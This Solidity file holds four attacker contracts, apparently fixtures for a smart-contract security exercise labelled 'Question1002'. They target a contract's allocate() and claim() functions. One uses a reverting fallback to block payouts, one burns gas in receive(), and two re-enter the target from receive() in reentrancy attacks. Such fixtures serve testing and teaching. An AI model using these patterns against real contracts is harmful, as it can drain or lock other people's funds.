// SPDX-License-Identifier: MIT 
pragma solidity 0.8.16;

interface toAttack{
    function allocate() external payable;
    function claim() external payable;
}

contract Question1002Attacker1 {
    address public target;

    constructor(address _target){
        target = _target;
    }

    function attack() external payable{
        toAttack(target).allocate{value: msg.value}();
    }

    fallback() external{
        revert("aaa");
    }
}

contract Question1002Attacker2{
    address public target;

    constructor(address _target){
        target = _target;
    }

    function attack() external payable{
        toAttack(target).allocate{value: msg.value}();
    }

    receive() payable external{
        uint res;
        for(uint i =0 ; i< 100; i++){
            res += uint(keccak256(abi.encode(i))) % 10000;
        }
    }

    fallback() external payable{

    }
}

contract Question1002Attacker3{
    address public target;

    uint private _stack;

    constructor(address _target){
        target = _target;
    }

    function attack() public payable{
        toAttack(target).allocate{value: 30 ether}();
    }

    receive() payable external{
        if(_stack < 1){
            _stack += 1;
            attack();
        }else{
            _stack = 0;
        }
    }

    fallback() external payable{

    }
}

contract Question1002Attacker4{
    address public target;

    uint private _stack;

    constructor(address _target){
        target = _target;
    }

    function attack() public payable{
        toAttack(target).claim();
    }

    receive() payable external{
        if(_stack < 1){
            _stack += 1;
            attack();
        }else{
            _stack = 0;
        }
    }

    fallback() external payable{

    }
}